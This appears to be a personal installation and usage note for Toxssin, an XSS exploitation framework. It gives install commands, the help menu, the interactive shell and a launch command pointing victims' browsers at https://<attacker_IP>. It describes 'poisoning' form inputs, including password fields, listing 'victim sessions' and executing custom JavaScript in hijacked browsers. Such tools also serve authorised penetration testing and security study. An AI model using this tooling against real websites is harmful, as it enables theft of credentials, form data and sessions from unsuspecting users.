# Toxssin

## Setup

### Install Dependencies

```
$ sudo apt install python3-ipython python3-pandas python3-validators
```

### Install Toxssin

- Run as root (without `sudo`)

```bash
git clone https://github.com/t3l3machus/toxssin /opt/exploitation/toxssin

cat << EOF > /usr/local/bin/toxssin
#!/bin/bash
cd /opt/exploitation/toxssin/
python3 toxssin.py \$*
EOF
chmod 755 /usr/local/bin/toxssin
```

## Help Menu

```
# toxssin -h
usage: toxssin.py [-h] -u URL -c CERTFILE -k KEYFILE [-p PORT] [-s SCRIPT_NAME] [-e ELEMENTS] [-f FREQUENCY] [-a COOKIE_AGE] [-t] [-g] [-v] [-q]

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Your toxssin server URL (e.g., https://your.domain.com, https://127.0.0.1)
  -c CERTFILE, --certfile CERTFILE
                        Your certificate.
  -k KEYFILE, --keyfile KEYFILE
                        The private key for your certificate.
  -p PORT, --port PORT  Port number to start the local toxssin https server (default: 443). Careful! This option does not set the port in the payload or
                        the malicious URLs generated on start up automatically. If you want to use a non-standard port both for the server and the URLs
                        pointing to it, you must append it in the server URL as well (e.g., ./toxssin.py -u https://toxssin.com:9001 -p 9001 ...)
  -s SCRIPT_NAME, --script-name SCRIPT_NAME
                        Change JS handler script name (default: handler.js)
  -e ELEMENTS, --elements ELEMENTS
                        Html elements to poison (default: input[type='text'], input[type='password'], input[type='date'], input[type='email'],
                        input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'],
                        input[type='radio'], input[type='checkbox'], select, textarea) *Forms, tables and file inputs are poisoned by default.
  -f FREQUENCY, --frequency FREQUENCY
                        Change html elements poisoning cycle frequency (default: 3000 ms)
  -a COOKIE_AGE, --cookie-age COOKIE_AGE
                        Toxssin cookie max age in days (default: 30)
  -t, --no-tables       Disable html tables spidering
  -g, --grab-poisoned   Identify and re-establish sessions sourcing from cached content (default: False)
  -v, --verbose         Verbose output (prepare for long stdout)
  -q, --quiet           Do not print the banner on startup
```

## Interactive Shell

```
toxssin > help

  Command                    Description
  -------                    -----------
  help                       Print this message.
  sessions                   Print all victim sessions data.
  active                     Print active session data (the one that is currently printing on stdout).
  activate <sid>             Change the active session by providing the session id.
  flush                      Delete all current sessions (reset).
  exec <JS file path> <sid>  Execute custom JS script against session by id.                  
  verbose                    Enable/disable verbose mode.
  clear/cls                  Clear screen.
  exit/quit/q                Terminate program.

  *All sessions are logged despite of which one is active.
```
## Usage

Note: you have to run this as root. Also I tested two vulnerable XSS types and they are **DOM-Based XSS** and **Stored XSS**. **Reflective XSS** doesn't work. 

`# openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365`

`# toxssin -u https://<attacker_IP> -c /absolute/path/to/cert.pem -k /absolute/path/to/key.pem`

## References

 - [Toxssin](https://github.com/t3l3machus/toxssin)